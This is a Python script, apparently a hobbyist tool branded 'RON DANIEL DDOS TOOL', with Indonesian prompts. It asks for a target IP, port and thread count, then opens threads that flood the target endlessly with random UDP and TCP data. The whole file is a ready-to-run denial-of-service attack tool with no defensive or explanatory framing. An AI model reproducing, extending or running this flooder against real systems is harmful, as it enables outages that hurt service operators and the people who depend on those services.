#YANG NYURI YATIM
#AUTHOR SIXNINESIX
import random
import socket
import threading
import os
import sys

os.system("clear")
print("""
\u001b[35m

██████╗░░█████╗░███╗░░██╗  ██████╗░░█████╗░███╗░░██╗██╗███████╗██╗░░░░░
██╔══██╗██╔══██╗████╗░██║  ██╔══██╗██╔══██╗████╗░██║██║██╔════╝██║░░░░░
██████╔╝██║░░██║██╔██╗██║  ██║░░██║███████║██╔██╗██║██║█████╗░░██║░░░░░
██╔══██╗██║░░██║██║╚████║  ██║░░██║██╔══██║██║╚████║██║██╔══╝░░██║░░░░░
██║░░██║╚█████╔╝██║░╚███║  ██████╔╝██║░░██║██║░╚███║██║███████╗███████╗
╚═╝░░╚═╝░╚════╝░╚═╝░░╚══╝  ╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝╚══════╝╚══════╝

██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░

████████╗░█████╗░░█████╗░██╗░░░░░
╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░
░░░██║░░░██║░░██║██║░░██║██║░░░░░
░░░██║░░░██║░░██║██║░░██║██║░░░░░
░░░██║░░░╚█████╔╝╚█████╔╝███████╗
░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝v2.1

 AUTHOR TOOLS : RESCRIPT BY RON DANIEL
 Tool Version: RON DANIEL DDOS TOOL V2.0
""")

ip = str(input(" Target Ip:"))
port = int(input(" Target Port:"))
choice = str(input(" GASKEN? (y/n):"))
times = int(input(" Packet target:"))
threads = int(input(" Threads yang dikirim:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Sent!!!")
		except:
			print("[!] Server Down!!!!")

def run2():
	data = random._urandom(999)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Sent!!!")
		except:
			s.close()
			print("[*] Server Down!")
            

def run3():
	data = random._urandom(818)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Sent!!!")
		except:
			s.close()
			print("[*] Server Down!")
            
  
def run4():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Sent!!!")
		except:
			s.close()
			print("[*] Server Down!")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
else:
		th = threading.Thread(target = run4)
		th.start()